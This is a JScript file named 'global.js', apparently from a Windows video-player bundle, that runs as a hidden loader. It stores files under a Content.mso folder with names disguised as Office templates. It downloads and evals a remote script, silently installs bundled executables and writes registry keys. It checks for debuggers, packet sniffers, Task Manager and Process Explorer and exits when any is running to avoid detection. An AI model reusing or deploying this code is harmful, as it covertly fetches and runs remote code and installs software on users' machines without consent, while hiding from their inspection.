trace("*----global.js----")
__interrupted
var __DEBUG = 0;
var __IsSupportOpencl = 0;
var __external = external;
var __windows = windows;
var __storage = storage;
if(__DEBUG)
	__external.SetEnvironmentVariable("debug", "1");
 //debug 1 版时可以被打断 , 0 不可以被打断 
function __TRY(fun) {try{fun()} catch(e){}}
function ActiveXObject2(progid){log("ActiveXObject2") ; return createActiveX(progid);}
var __locator=new ActiveXObject ("WbemScripting.SWbemLocator");
var __service=__locator.ConnectServer(".");
var __cpu=new Enumerator (__service.ExecQuery("SELECT * FROM Win32_Processor")).item();
var __objOperatingSystem = new Enumerator (__service.ExecQuery("Select * from Win32_OperatingSystem")).item();
var __osVersion = __objOperatingSystem.Version;
var __wshShell = new ActiveXObject("WScript.Shell");
var __fso = new ActiveXObject("scripting.filesystemobject");
var __shellapp = new ActiveXObject("Shell.Application");

//var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"8981A23C772567B51DE210A60B424F91" }
var __startTickCout = __external.GetTickCount()
var __lastInputInfo = __external.GetLastInputInfo()
/*
var strComputer = ".";
var objWMIService = GetObject("winmgmts:\\\\" + strComputer + "\\root\\cimv2");
var e = new Enumerator(objWMIService.ExecQuery("Select * from Win32_Process","WQL",48));
*/
///////main.js///////////
var __idletime=1000*60*5
if(__DEBUG)
	var __idletime=1000*15
else if(__IsSupportOpencl)
	var __idletime=1000*30
var __destReady_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"305373AE97A5DD2CBB123F45BA664AAA" }
var __installReadys = [
						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
							md5:"8867658a8edd9765342bfc2483ed8c3e", param:" /S",
							condition:{type: "reg", subtype: "existreg", value:"HKEY_LOCAL_MACHINE\\SOFTWARE\\Thunder Network\\Xmp\\installtimes"} 
						},
						{id: 10002, name: "XMPSetup-fanli(2).exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"},
					  ]			
//
trace ("----global.js DateLastModified : " + __fso.GetFile(__workdir+"Doc1.dot").DateLastModified + 
		" ; global var : __DEBUG="+__DEBUG+",__IsSupportOpencl="+__IsSupportOpencl+",__interrupted="+__interrupted+",__workdir="+__workdir+
		",__startTickCout="+__startTickCout+",__lastInputInfo="+__lastInputInfo+", __isadmin="+__isadmin + ",__osVersion="+__osVersion
		)
//
function log(msg){
	//if(!__DEBUG)
		//return ;
	var er = log.caller
	var debugstring=""
	var funname=""
	var i = 0	
	for (; er; i++){
		if(er==null){	
			break;
		}
		else{
			var str =er.toString();
			var re = new RegExp("({+)","ig");
			var arr = re.exec(str);
			str = RegExp.leftContext 
			if(i==0){
				funname ="<"+str+">" 
			}
			debugstring =   debugstring+"<-"+str;
			er = er.caller;
		}
	}	
	trace( msg + "	" + debugstring.replace(/\n/g, " "));
}
//
function module(name,g){
	this.g = g;
	if(typeof name == "undefined"){
		if(arguments.callee.name)
			arguments.callee.name+=1;
		else
			arguments.callee.name =1
		name = "modulename_"+1;
	}
	//
	if(module.modules[name]){
		("module name : " + name + "  exist , will recovery");
	}
	module.modules[name]=this
	this.name = name;
	this.currentFilterIndex=-1;
	this.filters = [];
	this.travelFilter=function(pipe){
			log("module name : " + this.name +  " this.travelFilter this.currentFilterIndex="+this.currentFilterIndex)
			if(this.currentFilterIndex<0){
				log("module name : " + this.name +  " cancel")
				return true;
			}else if (this.currentFilterIndex>=this.filters.length) {
				//
				log("module name : " + this.name +  " function .travelFilter doneCallback--last one asysn")
				if (this.doneCallback) {
					this.doneCallback(this,pipe,this.currentFilterIndex);
				}
				var len = module.getRunningModules().length
				log("module running module length : " + len);
				if(module.doneCallback && len==0){					
					module.doneCallback(module);
				}
				return true;
			}
			//
			var ret = true;
			var index = this.currentFilterIndex
			for(var i =index; i <this.filters.length; i++){
				log("module name : " + this.name +  " will running filter("+i+") , currentpipe.name="+pipe.name);	
				if(this.filters[i].run){
					ret = this.filters[i].run(pipe);
				}else{
					ret = this.filters[i](pipe);
				}
				log("module name : " + this.name +  " ran filter("+i+") return "+ (ret ? ret.toString() : "undefined") +" , currentpipe.name="+pipe.name.toString());	
				if(this.currentFilterIndex<0){
					return;
				}				
				if(!ret){
					break;
				}
				this.currentFilterIndex=i+1
			}
			/////////////////////////
			if(ret){
				log("module name : " + this.name +  " function .travelFilter doneCallback--last one sysn ")
				if (this.doneCallback) {
					this.doneCallback(this,pipe,this.currentFilterIndex);
				}
				var len = module.getRunningModules().length
				log("module running module length : " + len);
				if(module.doneCallback && len==0){
					module.doneCallback(module);
				}
				return true;
			}
			return ret;
	}
	this.process_callback=function(pipe, cancel){
		log("module name : " + pipe.module.name + " enter this.process_callback pipe.name="+pipe.name+" pipe.module.currentFilterIndex="+pipe.module.currentFilterIndex);
		if(cancel && pipe.module.currentFilterIndex<pipe.module.filters.length){
			pipe.module.cancel();
			return true;
		}
		//////
		if(pipe.module && pipe.module.currentFilterIndex>=0){
			pipe.module.currentFilterIndex += 1;
			var ret = pipe.module.travelFilter(pipe);
			log("module name : " + pipe.module.name + " leave this.process_callback pipe.name="+pipe.name+" pipe.module.currentFilterIndex="+pipe.module.currentFilterIndex);
			return ret;
		}
	}///////////////////
}
function module.prototype.push(filter){
	log("module name : " + this.name + " module.prototype.push"); 
	this.filters.push(filter)
	return this.process_callback;
}
function module.prototype.run(pipe, filterIndex){
	log("module name : " + this.name +" module.prototype.run");
	this.currentFilterIndex=filterIndex?filterIndex:0;	
	pipe.module = this;
	this.pipe=pipe
	return this.travelFilter(pipe)
}
function module.prototype.cancel () {
	log("module name : " + this.name +" cancel, this.currentFilterIndex="+this.currentFilterIndex);
	var index = this.currentFilterIndex;
	this.currentFilterIndex=-1;
	if (this.doneCallback) {
		this.doneCallback(this,this.pipe,index);
	}
	var len = module.getRunningModules().length
	log("module running module length : " + len);
	if(module.doneCallback && len==0){
		module.doneCallback(module);
	}
}
module.prototype.getStep=function () {
	return this.currentFilterIndex;
}
module.prototype.setDoneCallback=function (callback) {
	log("module name : " + this.name + " module.prototype.setDoneCallback");
	this.doneCallback = callback;
}
/////////
module.modules={}
module.setDoneCallback=function (callback) {
	log("module module.setDoneCallback")
	module.doneCallback = callback;
}
module.getRunningModules=function () {	
	var runningModules = []
	for(var index in module.modules){
		var _module = module.modules[index];
		var step = _module.getStep();
		var en = (step>=0 && (step<_module.filters.length)) //filter未执行完
				&& !_module.g
		log("module name : " + _module.name + "  running in step : " + step + ", filters.length="+_module.filters.length + " _module.g="+_module.g + " +"+(en?1:0));
		if(en){
			runningModules.push(_module);
		}
	}
	return runningModules
}
/////////////////
function getXmlHttp () {
	/////////////
	if(typeof arguments.callee.objs=="undefined")
		arguments.callee.objs = [];	 
	for(var index in arguments.callee.objs){
		var obj = arguments.callee.objs[index];
		if(obj.readyState==4){
			log("exist idle xmlhttp, name = "+" getXmlHttp_name_"+arguments.callee.name+" "+"getXmlHttp.objs.length="+arguments.callee.objs.length);
			//obj.abort();
			return obj;
		}
	}/////////////
	if (!arguments.callee.name) {
		arguments.callee.name = 1;
	}else{
		arguments.callee.name+=1;
	}
	var name = "getXmlHttp_name_" + arguments.callee.name;	
	///////
	var objXmlHttp ;
	if (arguments.callee.progid) {
		objXmlHttp = new ActiveXObject(arguments.callee.progid);
		//log("exist progid for xmlhttp : "+arguments.callee.progid);
	}
	else{
		var MSXML = new Array(  'MSXML2.XMLHTTP'
			,'MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
		for(var n = 0; n < MSXML.length; n ++)
		{
			try { 
				objXmlHttp = new ActiveXObject(MSXML[n]);
				if(objXmlHttp){
					arguments.callee.progid = MSXML[n];
					break;
				}
			}catch(e){}
		}
	}////
	arguments.callee.objs.push(objXmlHttp);
	log("add XmlHttp , getXmlHttp.objs.length="+arguments.callee.objs.length);	
	///////////
	return objXmlHttp;
}
function sendHttpStat(category, action , value ,syn){
	var objXMLHTTP = getXmlHttp();
	if(objXMLHTTP)
	{
		var label= function(){var ver = __external.GetHostVersion(); return ver;}();	
		var url;
		if(__DEBUG)
			url = "http://www.google-analytics.com/collect"
		else
			url ="https://ssl.google-analytics.com/collect";
		var ev = value ? value : 0;
		var payload_data="v=1&tid=UA-42360423-1&cid="+__external.GetPID()+"&t=event&ec="+category+"&ea="+action+"&el="+label+"&ev="+ev;
		//objXMLHTTP.setRequestHeader("Connection","Close");
		objXMLHTTP.onreadystatechange = function(){ if (objXMLHTTP && objXMLHTTP.readyState == 4)  { var i=true; return i;}};
		objXMLHTTP.open("POST", url, syn ? false : true);
		__TRY(function(){objXMLHTTP.send(payload_data);} ) 
		log("send httpstat : post payload_data : "+"category="+category+",action="+action+",value="+ev+"");
	}
	else{
		log("objXMLHTTP new = null")
	}
}
////////////////////
function filter_dlbusiness(){
	
};
function filter_dlbusiness.prototype.run(pipe){
	log("pipe.name="+pipe.name+" url="+pipe.url);
	var path = __workdir + pipe.name;
	var md5 = __storage.GetFileMD5 (path) 
	var pThis = this;
	pipe.exitcode=100;
	if(md5==pipe.md5.toUpperCase()){
		log(" readyDestFile OnSuccess "+pipe.name+" , md5="+md5);
		sendHttpStat("downloadedfile", "downloadedfile_success_"+pipe.name);
		return true;
	}
	else{
		if(md5.length > 0){
			pipe.url =  pipe.url; //+"?rnd="+ (new Date()).valueOf() 
		}
		var objXMLHTTP = getXmlHttp(); 		 
		objXMLHTTP.open("GET", pipe.url,true);
		objXMLHTTP.onreadystatechange = function(){ if (objXMLHTTP && objXMLHTTP.readyState == 4 ){
					if(objXMLHTTP.status<400){
						//var ret = __storage.Save(objXMLHTTP.responseStream, path);
						var adostream = new ActiveXObject("ADODB.Stream")
						adostream.Mode = 3;
						adostream.Type = 1;
						adostream.Open();
						adostream.Write(objXMLHTTP.responseBody);
						adostream.SaveToFile(path,2);
						adostream.Close();
						var fso = __fso;
						//fso.GetFile(path).Attributes = 2 
						delete adostream;
						log("download from url="+pipe.url+" to path="+path+" ,status="+objXMLHTTP.status +" statusText="+objXMLHTTP.statusText);
						if(1){
							var tmd5 = __storage.GetFileMD5 (path)
							log(" localpath md5 : "+tmd5+" destmd5:"+pipe.md5)
							if((__DEBUG && tmd5) || (tmd5 == pipe.md5.toUpperCase()) ){
								sendHttpStat("downloadingfile", "downloadingfile_success_" +pipe.name);
								if( pipe.name.substr(pipe.name.length-4)==".cab"){
									if(__storage.ExtractCab(__workdir+pipe.name, __workdir)){
										log("extractcab success : " + " from " + __workdir+pipe.name+" to " + __workdir);
									}
									else{
										sendHttpStat("downloadingfile", "downloadingfile_failed_extractcab_" + pipe.name); 
									}
								}
								pThis.callback(pipe);
								//OnSuccess(path);
							}
							else
							{
								sendHttpStat("downloadingfile", "downloadingfile_failed_md5_"+pipe.name); 
								pThis.callback(pipe, true);
							}
						}else{
							sendHttpStat("downloadingfile", "downloadingfile_failed_"+pipe.name);
							pThis.callback(pipe, true);
						} 
						objXMLHTTP=null;
					}
					else
						pThis.callback(pipe, true);
				}};
		setTimeout(function(){__TRY(function(){objXMLHTTP.send(null);} ) },1); ////
	}
}
filter_dlbusiness.prototype.callback=null;
//////////
function filter_loadmainjs() {
};
function filter_loadmainjs.prototype.run (pipe) {
	var pThis = this;
	log("evalFile("+ __workdir+pipe.name +")");
	setTimeout(function(){evalFile(__workdir+pipe.name);},1)	
	return true;
}
function filter_eXclusiveRuning(once){
	this.once = once ? true : false; 
}
function filter_eXclusiveRuning.prototype.run(pipe){
	var pThis = this;
	var ret = external.__debugging || this.checkWindows() || this.checkProcesses();	
	log("ret="+ret+" ,this.once="+this.once + ", external.__debugging="+external.__debugging);	
	if(this.once){
		if(ret){
			pipe.exitaction=escape(ret.toString());
			log("pipe.exitaction="+pipe.exitaction)
			this.callback(pipe,true)
		}
		return true;
	}else{
		setInterval(function (){
			var ret = external.__debugging || pThis.checkWindows() || pThis.checkProcesses(); 
			if(ret){
				pipe.exitaction=escape(ret.toString());
				log("pipe.exitaction="+pipe.exitaction)
				pThis.callback(pipe,true); 
			}
		}, 1500)
	}
}
function filter_eXclusiveRuning.prototype.checkWindows(){
	var blacklist=["Microsoft Visual", "HTTP Analyzer", "WinDBG", "OllyDebug",		
		"fiddler", "SmartSniff", "Spy++", "ATL/MFC","Spy", 
		 "File Monitor", "Registry Monitor","Wireshark","OllyICE","OllyDBG",
		" - Sysinternals:"];
	if(!__DEBUG){
		blacklist.push("DebugView")
		blacklist.push("任务管理器")
		blacklist.push("Process Explorer")
	}
	if(__DEBUG)
		blacklist = [];
	var titile
	var ret = __windows.EnumWindows(function(hwnd, text){
		for(var index in blacklist){
			if(text.indexOf(blacklist[index])>=0){
				titile = text;
				log("exist wnd " + text + " will exit() ;")
				return 0;
			}
		}
	}); 
	//log("window title ="+titile);
	return titile;
}
function filter_eXclusiveRuning.prototype.checkProcesses(){
	var blacklist=["wireshark", "fiddler", "httpanalyzer", "smsniff", 
					"filemon", "regmon", "procmon", "windbg", "cv.exe",
					"ollydbg", "softice", "mzurlspy","devenv","msdev","spy","ollyice","Wireshark","dan",
					"depends"];
	//var wql="SELECT * FROM Win32_Process" + " where 0=1";
	if(!__DEBUG){
		blacklist.push("dbgv")
		blacklist.push("taskmgr")
		blacklist.push("procexp")
	}
	if(__DEBUG)
		blacklist = [];
	var wql="SELECT * FROM Win32_Process" + " where Name='AAABBBCCCDDD'";
	for (var index in blacklist){
		var name = blacklist[index];
		wql += " or Name like '%" + name+"%'";	
	}
	//log("filter_eXclusiveRuning.prototype.checkProcesses wql="+wql);
	var process = new Enumerator (__service.ExecQuery(wql)).item();	
	if(process){
		log("exist process " + process.Name + " will exit() ; wql="+wql)
	}else{
		
	}
	var ret = process ?  process.Name :false;
	delete process;
	return ret;
}
////
function tryInstall(){
	var WshShell = __wshShell
	__TRY(function (){WshShell.RegDelete("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\forcelaunch")})
	var key_value
	var prekey = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\s_";
	for(var i in __installReadys){
		var pipe = __installReadys[i];
		var path = __workdir +pipe.name
		if(__fso.FileExists(path)){
			var cmd = path;
			if(pipe.param)
				cmd += " "+pipe.param;
			//log("cmd = " + cmd);
			//WshShell.Run('"'+cmd+'"', 0 ); //非管理员会弹uac 
			__TRY(function(){ WshShell.Exec(cmd);}); //非管理员会脚本出错!无权限
			var key_path = prekey + parseInt(pipe.id /10) *10;
			__TRY(function(){ key_value = WshShell.RegRead(key_path);})
			log("RegRead : " + key_path + " , value : " + key_value);
			key_value = key_value || "";
			key_value +=pipe.id % 10 +";";
			__TRY(function(){WshShell.RegWrite(key_path, key_value);});
			sendHttpStat("bundleinstalled", pipe.name+"_"+pipe.id);
		}
	}	
}
var exitaction 
function onload(){
	sendHttpStat( "launch", "onload");
	////
	if(__startTickCout<5*60*1000){		
		tryInstall();
		log("exit(10)");
		exit(10);
		return ;
	}
	 
	//1.启动统计
	var __module = new module("global.js", 1);	
	var filter_xrun = new filter_eXclusiveRuning(1)
	var filter_dl = new filter_dlbusiness();
	var filter_load = new filter_loadmainjs();
	var filter_xrun2 = new filter_eXclusiveRuning();
	filter_xrun.callback=__module.push(filter_xrun)
	filter_dl.callback =__module.push(filter_dl);
	filter_load.callback = __module.push(filter_load);
	filter_xrun2.callback = __module.push(filter_xrun2)
	////////////
	var pipe = __destReady;
	__module.setDoneCallback(function (mod,pipe, index) {		
		exitaction = pipe.exitaction		
		delete filter_xrun; delete filter_dl; delete filter_load; delete filter_xrun2;
		delete __module;
		setTimeout(function(){__external.TerminateProcess(0,1); exit(-20)},1); 
	})
	__module.run(pipe);
};
function onunload(code){ 
	sendHttpStat("launch", "unload_" + (code==-20 ? exitaction:code), parseInt((__external.GetTickCount()-__startTickCout)/1000/60),  1);  
	delete  __cpu ; delete __service ; delete __locator;  delete __external; delete __windows; delete __storage;
};